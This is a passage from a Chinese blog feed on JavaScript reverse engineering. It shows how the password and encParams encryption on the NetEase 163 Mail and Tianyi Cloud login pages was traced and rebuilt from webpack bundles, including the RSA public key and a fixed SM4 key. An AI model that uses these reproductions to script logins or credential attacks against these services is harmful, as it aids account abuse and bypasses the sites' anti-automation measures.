function_">S</span>(f) : <span class="title function_">T</span>(f, e.<span class="property">radix</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> h</span><br><span class="line">                &#125;(Q, e, K.<span class="property">PKCS1Padding</span>, K.<span class="property">RawEncoding</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        t.<span class="property">default</span> = V</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;87377&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = e;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">return</span> t = p.<span class="property">default</span>.<span class="title function_">encryptedString</span>(e),</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(),</span><br><span class="line">      t</span><br><span class="line">  &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">  &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易163邮箱登录RSA加密</title>
      <link href="/2024/05/08/%E7%BD%91%E6%98%93163%E9%82%AE%E7%AE%B1%E7%99%BB%E5%BD%95RSA%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/05/08/%E7%BD%91%E6%98%93163%E9%82%AE%E7%AE%B1%E7%99%BB%E5%BD%95RSA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：网易163邮箱登录RSA加密018</li><li>链接：<a href="https://smart.mail.163.com/login.htm">https://smart.mail.163.com/login.htm</a></li><li>简介：定位<strong>密码字段</strong>的加密算法和<strong>encParams</strong>参数的加密过程</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081044026.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><h2 id="1-密码字段pw"><a href="#1-密码字段pw" class="headerlink" title="1. 密码字段pw"></a>1. 密码字段pw</h2><h3 id="（1）定位密码字段"><a href="#（1）定位密码字段" class="headerlink" title="（1）定位密码字段"></a>（1）定位密码字段</h3><p>查看network字段，发现有3个可能涉及的请求接口：”gt”、”l”、”powGetp”</p><p>里面请求体都为 encParams加密字段，所以判断不出哪个接口是真正的password加密</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081048395.png" alt="image.png"> </p><p>所以，这块需要将这三个接口都打XHR断点。每个接口都进行跟栈。</p><p>直接无脑xhr断点，一步步向上跟栈就完事了。。。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081048448.png" alt="image.png"> </p><h3 id="（2）第一个接口：”gt”"><a href="#（2）第一个接口：”gt”" class="headerlink" title="（2）第一个接口：”gt”"></a>（2）第一个接口：”gt”</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081057585.png" alt="image.png"> </p><p>向前跟栈，看能不能定位到和password相关的内容：这块具体过程就省略了……</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081057559.png" alt="image.png"> </p><p>继续向前一步跟栈，发现输入的用户名成功显示了，但没有任何密码相关的字段</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058772.png" alt="image.png"> </p><p>向前继续跟一下栈，确实没有发现任何密码字段相关内容。猜测该<strong>接口 “gt” 不是密码加密接口</strong>。</p><h3 id="（3）第二个接口：”l”"><a href="#（3）第二个接口：”l”" class="headerlink" title="（3）第二个接口：”l”"></a>（3）第二个接口：”l”</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058487.png" alt="image.png"> </p><p>向前跟栈……</p><p>找到了这样一个栈中提到了”un”和”pw”字段，不出意外，对应下来，应该是用户名和加密后的密码</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081058410.png" alt="image.png"> </p><p>再向前跟栈，最终定位pw字段最后一次出现的位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081059207.png" alt="image.png"> </p><p>再往前跟栈，发现找不到pw字段了。所以，这块在当前JS中搜索关键字 “pw”</p><p>找到多处，仔细观察发现涉及到pw的代码都有出现函数<strong>MP.encrypt2</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e.pw = MP.encrypt2(this.__password);</span><br><span class="line">t.pw = MP.encrypt2(this.$refs.mpinput._$getValue() || &quot;0&quot;);</span><br><span class="line">t.pw = MP.encrypt2(i);</span><br><span class="line">e.pw = MP.encrypt2(this.__password);</span><br></pre></td></tr></table></figure><p>下断点，最终在 “t.pw &#x3D; MP.encrypt2(i);” 位置断下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081107555.png" alt="image.png"> </p><p>也就说明 <strong>MP.encrypt2</strong> 是真正的加密函数。</p><h3 id="（4）第三个接口”powGetp”"><a href="#（4）第三个接口”powGetp”" class="headerlink" title="（4）第三个接口”powGetp”"></a>（4）第三个接口”powGetp”</h3><p>这个就不说了，和上面分析思路类似。看了下跟密码字段也没啥关系</p><h3 id="（5）MP-encrypt2加密函数分析"><a href="#（5）MP-encrypt2加密函数分析" class="headerlink" title="（5）MP.encrypt2加密函数分析"></a>（5）MP.encrypt2加密函数分析</h3><p>确认为RSA加密。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081109251.png" alt="image.png"> </p><p>硬扣代码：搞定！</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="comment">//前面代码省略，就直接将这个JS拿下来就行</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt2</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5gsH+AA4XWONB5TDcUd+xCz7ejOFHZKlcZDx+pF1i7Gsvi1vjyJoQhRtRSn950x498VUkx7rUxg1/ScBVfrRxQOZ8xFBye3pjAzfb22+RCuYApSVpJ3OO3KsEuKExftz9oFBv3ejxPlYc5yq7YiBO8XlTnQN0Sa4R4qhPO3I2MQIDAQAB-----END PUBLIC KEY-----&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> t = <span class="variable constant_">RSA</span>.<span class="title function_">getPublicKey</span>(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">RSA</span>.<span class="title function_">encrypt</span>(e, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081109195.png" alt="image.png"> </p><h2 id="2-encParams加密参数"><a href="#2-encParams加密参数" class="headerlink" title="2. encParams加密参数"></a>2. encParams加密参数</h2><p>全局搜索，定位到参数位置：确认SM4加密</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081110950.png" alt="image.png"> </p><h3 id="（1）跟进加密函数r-sm4Encrypt"><a href="#（1）跟进加密函数r-sm4Encrypt" class="headerlink" title="（1）跟进加密函数r._$sm4Encrypt"></a>（1）跟进加密函数r._$sm4Encrypt</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_p._$sm4Encrypt = function(e) &#123;</span><br><span class="line">        return window.URSSM4.encrypt(JSON.stringify(e), _sm4pubkey)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111173.png" alt="image.png"> </p><p>这块的 _sm4pubkey 是固定值为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_sm4pubkey = &#x27;BC60B8B9E4FFEFFA219E5AD77F11F9E2&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111473.png" alt="image.png"> </p><p>定位 “window.URSSM4.encrypt” 函数位置，发现是webpack的形式</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111841.png" alt="image.png"> </p><h3 id="（2）webpack代码分析"><a href="#（2）webpack代码分析" class="headerlink" title="（2）webpack代码分析"></a>（2）webpack代码分析</h3><p>①代码先复制进notepad++中</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081111138.png" alt="image.png"> </p><p>②找到分发器的位置</p><p>发现这块有调用的过程，且调用函数为n，所以猜测函数n所在位置可能为分发器</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112926.png" alt="image.png"> </p><p>下断点，重新刷新一下页面（因为webpack是在页面最初就加载进来的，所以需要刷新页面）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112841.png" alt="image.png"> </p><p>成功断下，定位到n的位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112802.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081112996.png" alt="image.png"> </p><p>分发器代码简单改写下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _e</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = n[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== r)</span><br><span class="line">      <span class="keyword">return</span> r.<span class="property">exports</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,i)</span><br><span class="line">     r = n[i] = &#123;</span><br><span class="line">       <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">       &#125;;</span><br><span class="line">    <span class="keyword">return</span> t[i](r, r.<span class="property">exports</span>, e),</span><br><span class="line">    r.<span class="property">exports</span></span><br><span class="line">  &#125;</span><br><span class="line">  _e = e</span><br><span class="line">&#125;(&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//加载webpack模块</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>③扣取加密模块代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">太多了，省略……</span><br></pre></td></tr></table></figure><p>④编写加密函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pwd = <span class="string">&#x27;&#123;&quot;un&quot;:&quot;admin123@163.com&quot;,&quot;pw&quot;:&quot;ffhnKr8vA0EIEEclcRR6Ik8sDkEkjcvalofxRMQcS+ADdxyWoPpZFE6pehucjf/+0F5MliRjC51VMPUkGK/ceLj5fTlhNj34pHSfnU7zMd35XwSaPax/ucpNWpStm4tb0gyl+rb0ulEzQn7Tk4FR1hCUcE5kyAjo52567M+Eb8Q=&quot;,&quot;pd&quot;:&quot;mail163&quot;,&quot;l&quot;:0,&quot;d&quot;:30,&quot;t&quot;:1695908789441,&quot;pkid&quot;:&quot;CvViHzl&quot;,&quot;domains&quot;:&quot;163.com&quot;,&quot;tk&quot;:&quot;8753c188d3bbad4996c4cf699e3beef5&quot;,&quot;pwdKeyUp&quot;:1,&quot;channel&quot;:0,&quot;topURL&quot;:&quot;https://smart.mail.163.com/login.htm&quot;,&quot;rtid&quot;:&quot;RXuDHOFWWNPiiotxQy3UqrnZvRh7yrSM&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _sm4pubkey = <span class="string">&#x27;BC60B8B9E4FFEFFA219E5AD77F11F9E2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_e</span>(<span class="string">&#x27;9579&#x27;</span>); <span class="comment">//定义导出函数，将加密模块导出为全局变量p</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">pwd</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> p.<span class="title function_">encrypt</span>(pwd, _sm4pubkey)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）完整代码测试"><a href="#（3）完整代码测试" class="headerlink" title="（3）完整代码测试"></a>（3）完整代码测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略略略……</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081115683.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405081115482.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> webpack </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>T翼云扣webpack原生代码</title>
      <link href="/2024/05/07/T%E7%BF%BC%E4%BA%91%E6%89%A3webpack%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/05/07/T%E7%BF%BC%E4%BA%91%E6%89%A3webpack%E5%8E%9F%E7%94%9F%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="逆向目标"><a href="#逆向目标" class="headerlink" title="逆向目标"></a>逆向目标</h1><ul><li>目标：天翼云登录框</li><li>链接：<a href="https://m.ctyun.cn/wap/main/auth/login">https://m.ctyun.cn/wap/main/auth/login</a></li><li>简介：主要对加密的函数的提取，找打加密的地方，分析加密函数，提取重要的JS代码进行加密算法还原</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071539849.png" alt="image.png"> </p><ul><li>发现这块的JS是webpack打包过的</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071539902.png" alt="image.png"> </p><p>webpack的特点：将所有的函数封装好，集成到一个个模块中，然后使用加载器或方法体来调用这些模块，变成一个对象，这样子就可以使用这个模块里面的函数和属性。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071541946.png" alt="image-20240507154149907"> </p><h1 id="webpack讲解"><a href="#webpack讲解" class="headerlink" title="webpack讲解"></a>webpack讲解</h1><p><a href="https://blog.csdn.net/sin_0119/article/details/129658679">js逆向——webpack扣法_webpack 逆向-CSDN博客</a></p><h2 id="01-webpack简介"><a href="#01-webpack简介" class="headerlink" title="01 webpack简介"></a>01 webpack简介</h2><p>webpack是个静态模块打包工具，目的是为了让前端工程师写的前端代码变成浏览器可以识别的代码，并且可以达到前端项目的模块化，也就是如何更高效地管理和维护项目中的每一个资源。</p><p>但无疑是对js逆向造成了妨碍。但如果掌握了扣取webpack的一些技巧也是不难的。接下来，说一下对扣取webpack代码的一些理解。</p><h2 id="02-webpack的组成"><a href="#02-webpack的组成" class="headerlink" title="02 webpack的组成"></a>02 webpack的组成</h2><p>一个最基本的webpack组成有两个部分:</p><ul><li>自执行函数</li><li>模块加载器(实际上也就是一个函数而已)</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071543472.png" alt="img"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.传入的参数是一个数组</span></span><br><span class="line"><span class="keyword">var</span> _xxx;</span><br><span class="line">！<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">xxx</span>(<span class="params">y</span>)&#123;    #这个是模块加载器，这个y传入的可以是索引和对象的key，参数表示的是列表或对象的形参</span><br><span class="line">        x[y].<span class="title function_">call</span>(参数) </span><br><span class="line">    &#125;</span><br><span class="line">    _xxx = xxx;</span><br><span class="line">&#125;( [<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个&quot;</span>)&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">consolelog</span>(<span class="string">&quot;第二个&quot;</span>)&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第三个&quot;</span>)&#125;</span><br><span class="line">   ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">//比如</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="number">0</span>); <span class="comment">//执行得到的就是输出——第一个</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="number">1</span>);<span class="comment">//执行得到的就是输出——第二个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.传入的参数是一个对象</span></span><br><span class="line"><span class="keyword">var</span> _xxx;</span><br><span class="line">！<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">xxx</span>(<span class="params">y</span>)&#123;    #这个是模块加载器，这个y传入的可以是索引和对象的key，参数表示的是列表或对象的形参</span><br><span class="line">        x[y].<span class="title function_">call</span>(参数) </span><br><span class="line">    &#125;</span><br><span class="line">    _xxx = xxx;</span><br><span class="line">&#125;( &#123;</span><br><span class="line">    <span class="attr">obj1</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个&quot;</span>)&#125;,</span><br><span class="line">    <span class="attr">obj2</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">consolelog</span>(<span class="string">&quot;第二个&quot;</span>)&#125;,</span><br><span class="line">    <span class="attr">obj3</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第三个&quot;</span>)&#125;</span><br><span class="line">   &#125; );</span><br><span class="line"><span class="comment">//因为传入的是一个对象，那想要调用对象就要指明key</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="string">&quot;obj1&quot;</span>)</span><br><span class="line"><span class="title function_">_xxx</span>(<span class="string">&quot;obj2&quot;</span>)<span class="comment">//和数组相比只是调用方式不同而已，原理基本一致</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="03-实战看webpack组成"><a href="#03-实战看webpack组成" class="headerlink" title="03 实战看webpack组成"></a>03 实战看webpack组成</h2><p>光说不练假把式，接下来我们从真实的网站中看一看关于webpack组成:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071602810.png" alt="img"> </p><p>通过观察真实网站的webpack可以发现,这种情况与我们自己写的那个大差不差，无非就是加载器函数中功能更完善了些。</p><p>这种加载器函数与执行对象在一个文件中的webpack很好扣js,至于如何扣我们以后再说，今天要解决的是下面的这种要怎么扣取代码呢?</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071603051.png" alt="img"> </p><p>就像图中所展示的那样，要怎么才能把目标给扣出来呢?</p><p>首先，想要扣取webpack代码就要先找到其基本要素，注意:自执行函数不是关键，关键的是传入的实参，也就是那个对象(数组)</p><ul><li>传入的实参<ul><li>传入的实参也就是我们的目标，把目标函数放到自己构建的对象里面就行了</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建自己的对象,把上面的目标给填到这个里面就行</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;wk8/&quot;</span>: <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;g&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;q&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;m&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;I&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;o&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;r&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;v&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;n&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = <span class="title function_">n</span>(<span class="string">&quot;zvER&quot;</span>)</span><br><span class="line">          , a = <span class="title function_">n</span>(<span class="string">&quot;MuMZ&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = &#123;</span><br><span class="line">                <span class="attr">username</span>: e,</span><br><span class="line">                <span class="attr">password</span>: <span class="title class_">Object</span>(a.<span class="property">a</span>)(t),</span><br><span class="line">                <span class="attr">captcha</span>: n</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> o.<span class="property">a</span>.<span class="title function_">formPost</span>(<span class="string">&quot;/user/login&quot;</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;test&quot;</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;test success!!&quot;</span>)&#125; <span class="comment">//这个仅用于测试使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><ul><li>当目标函数中有依赖的模块时，把依赖的模块也通通放到自己写的对象里面即可</li></ul></li></ul><ul><li>加载器函数</li></ul><ul><li><ul><li>当看到如上图的代码时可能会有人会不明白这哪里有加载器，就连自执行函数都没有</li><li>但实际上肯定是有加载器的，如图</li></ul></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071606459.png" alt="img"> </p><ul><li><ul><li>所以在定位到目标时，目标的大函数一般会加载其他模块，若要加载其他模块就会使用到加载器，以此就可以找到加载器了</li></ul></li><li><p>但是，当断到我们想要的[目标函数]时再去定位n(“”)函数哪里是显示不出来的，如图</p></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071608705.png" alt="image-20240507160832661"> </p><p>这是因为加载器函数实际上是在你打开网页的时候就已经加载到内存中了，而只有当我们进行登录这一具体操作时才会执行调用这个函数，所以这时是找不到加载器的。</p><p>解决方法也很简单: 只需在加载模块的前面加上断点，然后刷新页面就可以找到加载器的位置了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071609396.png" alt="img"> </p><ul><li>到此，目标函数以及加载器都已经找齐了</li></ul><h2 id="04-webpack调用原理分析"><a href="#04-webpack调用原理分析" class="headerlink" title="04 webpack调用原理分析"></a>04 webpack调用原理分析</h2><p>在上面的环节中我们确定了目标函数并找到了加载器，但正如我们看到的那样，它并不像我们自己写的那个webpack直接把大对象给传进去了，而是在另一个独立的文件里面，那么加载器又是如何对另一份独立的文件中的模块进行加载的呢?</p><p>首先来看我们找的的那个加载器,如图：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071615605.png" alt="img"> </p><p>接下来我们要解决的是自执行函数的形参c是如何变成独立文件中的那个存有模块的对象的:</p><ol><li>我们把得到的自执行函数拿出来放到node.js环境中执行一下</li></ol><ul><li><ul><li>其中将传入的空数组变成一个对象，对象里面放有一个测试函数</li><li>输出自执行函数的形参</li><li>并将加载器函数给导出来</li></ul></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071619382.png" alt="img"> </p><ol start="2"><li>我们将目标函数所在的那个独立文件全部写入到另一个文件当中去</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620373.png" alt="img"> </p><ol start="3"><li>在自执行函数的上面对刚刚写入的文件进行引入，再次执行函数</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620775.png" alt="img"> </p><ol start="4"><li>通过实验，我们知道了通过引入外部文件可以将模块加载到形参里面，那么是如何实现的呢? 通过调试自执行代码可以明白</li></ol><ul><li>在与单个文件有相同部分下面可疑部分打上几个断点如下:</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620297.png" alt="img"> </p><ul><li>接着向下进行，通过读代码可以知道通过for循环执行了函数n(),通过下图可以知道是为了加载外部模块</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620315.png" alt="img"> </p><ul><li>再向下进行到第三个断点</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071621596.png" alt="img"> </p><p>至于那个for循环是怎么将外部模块进行引入的我们并不需要深究，只需要知道当扣代码时一定不能将这个for循环给忘掉，如果忘掉的话外部文件是无法加载进来的。</p><h1 id="逆向参数"><a href="#逆向参数" class="headerlink" title="逆向参数"></a>逆向参数</h1><h2 id="1-定位到password加密函数"><a href="#1-定位到password加密函数" class="headerlink" title="1. 定位到password加密函数"></a>1. 定位到password加密函数</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071624397.png" alt="img"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeURI(Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value))))</span><br></pre></td></tr></table></figure><p>拆分一下后如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r.value</span><br><span class="line">Object(w[&quot;g&quot;])(r.value)</span><br><span class="line">Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value)</span><br><span class="line"></span><br><span class="line">a.value</span><br><span class="line"></span><br><span class="line">Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value)))</span><br><span class="line"></span><br><span class="line">encodeURI(Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value))))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071624714.png" alt="img"> </p><h2 id="2-第一个参数分析"><a href="#2-第一个参数分析" class="headerlink" title="2. 第一个参数分析"></a>2. 第一个参数分析</h2><p>a.value：直接就是输入的密码明文</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071625245.png" alt="img"> </p><h2 id="3-第二个参数分析"><a href="#3-第二个参数分析" class="headerlink" title="3. 第二个参数分析"></a>3. 第二个参数分析</h2><p>Object(w[“f”])(Object(w[“g”])(r.value)</p><h3 id="（1）w-“g”"><a href="#（1）w-“g”" class="headerlink" title="（1）w[“g”]"></a>（1）w[“g”]</h3><p>这个函数是js的[字符串替换]函数，这个函数有两个参数，第一个函数可以是字符串或正则表达式（用以进行匹配的子字符串），第二个函数是字符串（替换匹配的子字符串）。就是在原字符串上把和第一个参数相同的字符串替换成第二个参数的字符串。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071626148.png" alt="img"> </p><p>这个例子使用的是正则表达式匹配字符串，其中”&#x2F; &#x2F;“这个是固定写法，”\s”是转移符号用以匹配任何空白字符，包括空格、制表符、换页符等等，“g”表示全局匹配将替换所有匹配的子串，如果不加”g”当匹配到第一个后就结束了。</p><p>这个例子的意思就是将原字符串中的所有空白字符替换成””，比如”abc d efg “字样的字符串使用这个函数后将变成”abcdefg”。</p><h3 id="（2）w-“f”"><a href="#（2）w-“f”" class="headerlink" title="（2）w[“f”]"></a>（2）w[“f”]</h3><p>这个函数的作用就是用户名填充。</p><p>当输出的用户名不足24位的时候，在后面补充 “0”。比如输入用户名为 “<a href="mailto:&#97;&#x64;&#109;&#x69;&#110;&#x40;&#49;&#x32;&#51;&#x2e;&#99;&#111;&#x6d;">&#97;&#x64;&#109;&#x69;&#110;&#x40;&#49;&#x32;&#51;&#x2e;&#99;&#111;&#x6d;</a>“，则填充后为 “<a 